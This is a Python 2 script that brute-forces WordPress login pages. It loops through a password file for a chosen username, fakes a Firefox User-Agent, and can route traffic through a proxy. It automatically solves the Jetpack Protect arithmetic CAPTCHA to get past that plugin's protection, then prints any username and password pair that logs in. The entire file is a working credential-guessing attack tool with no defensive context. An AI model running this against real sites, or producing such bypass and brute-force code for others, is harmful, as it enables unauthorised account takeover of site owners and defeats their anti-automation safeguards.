try:
    import mechanize
    #import cookielib
    import re
    import argparse
    import warnings
except Exception,e:
    print "[!] Error: "+str(e)
    print "[*] Make sure you have the following Python modules installed:\n\tmechanize, re, argparse, warning"
    exit(0)

warnings.filterwarnings("ignore")
    
parser = argparse.ArgumentParser(description="WordPress login page attack. Supports 'Jetpack' plugin protection bypass.\n")
parser.add_argument('-t','--target', help='WordPress target', required=True)
parser.add_argument('-u','--user', help='WordPress username to attack', required=True)
parser.add_argument('-p','--plist', help='File containing passwords', required=True)
parser.add_argument('-x','--proxy', help='HTTP/HTTPS proxy setting (ip_address:port)')
parser.add_argument('-v','--verbose', help='Show verbose message', action='store_const', const=True)
args = parser.parse_args()

target = args.target.encode('utf-8')
wp_username = args.user.encode('utf-8')
pass_file = args.plist.encode('utf-8')
wp_jetpack_protect_num = ""

if target.endswith("/"):
    target = target[:-1]

target = target+"/wp-login.php"
    
f = open(pass_file, "r")
pass_list = f.readlines()

for wp_password in pass_list:
    try:
        wp_password = (wp_password.replace("\r", "")).replace("\n", "")
        # Browser
        br = mechanize.Browser()
        
        #Set proxy
        if args.proxy:
            br.set_proxies({"http": args.proxy, "https": args.proxy})
        
        # Cookie Jar
        #cj = cookielib.LWPCookieJar()
        #br.set_cookiejar(cj)

        # Browser options
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)

        # User-Agent (this is cheating, ok?)
        br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

        r = br.open(target)

        lines = str(br.response().read())
        
        #print "[*] HTML source of the target URL: " + target + "\n" + lines
        
        if "jetpack_protect_num" in lines:
            # lines = '5 &nbsp; + &nbsp; 10 &nbsp; = &nbsp;'
            searchObj = re.search( '(\d{1,}) \&nbsp\; \+ \&nbsp\; (\d{1,}) \&nbsp\; \= \&nbsp\;', lines, re.M|re.I)
            if searchObj:
                if args.verbose:
                    print "[+] Jetpack Pattern : ", searchObj.group()
                    print "\t[-] Jetpack 1st digit : ", searchObj.group(1)
                    print "\t[-] jetpack 2nd digit : ", searchObj.group(2)
                wp_jetpack_protect_num = str(int(searchObj.group(1)) + int(searchObj.group(2)))
            else:
                if args.verbose:
                    print "[!] Jetpack pattern not found"

        # Show the available forms
        #if args.verbose:
        #    for f in br.forms():
        #        print f

        # Select the first (index zero) form
        br.select_form(nr=0)

        br.form['log'] = wp_username
        br.form['pwd'] = wp_password
        if len(wp_jetpack_protect_num)>=1:
            br.form['jetpack_protect_num'] = wp_jetpack_protect_num
        if args.verbose:
            print "[+] Submitting form with following details:"
        if args.verbose:
            print "[-] Trying: " + wp_username + " : " + wp_password
        br.submit()
        #print br.response().read()
        if "Log Out" in br.response().read():
            print "[*] Found: " + wp_username + " : " + wp_password
    except Exception,e:
        print "Exception occurred" + str(e)
